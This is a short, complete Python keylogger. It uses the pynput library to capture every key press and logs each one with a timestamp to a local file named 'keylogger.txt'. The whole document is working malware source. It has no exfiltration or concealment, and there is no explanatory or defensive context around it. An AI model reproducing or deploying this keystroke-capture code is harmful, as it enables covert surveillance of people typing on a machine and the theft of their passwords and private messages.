from pynput.keyboard import Listener
import logging

def on_press(key):
    logger.info(key)

logging.basicConfig(filename="keylogger.txt", filemode="w+", format="%(asctime)s %(message)s")
logger = logging.getLogger()
logger.setLevel(logging.INFO)

with Listener(on_press=on_press) as listener:
    listener.join()
